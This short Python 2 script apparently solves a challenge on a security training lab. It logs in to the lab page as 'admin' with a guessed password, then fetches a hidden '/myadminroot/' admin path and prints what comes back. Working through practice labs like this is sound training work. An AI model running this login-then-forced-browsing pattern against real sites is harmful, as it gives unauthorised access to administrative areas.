import requests
session = requests.Session()
url = 'http://lab1.xseclab.com/pentest3_307c0281537de1615673af8c1d54885a/'
data = {'username': 'admin', 'password': 'aa'}
reqpost = session.post(url, data=data)
url2 = 'http://lab1.xseclab.com/pentest3_307c0281537de1615673af8c1d54885a/myadminroot/'
reqget = session.get(url2)
print reqget.content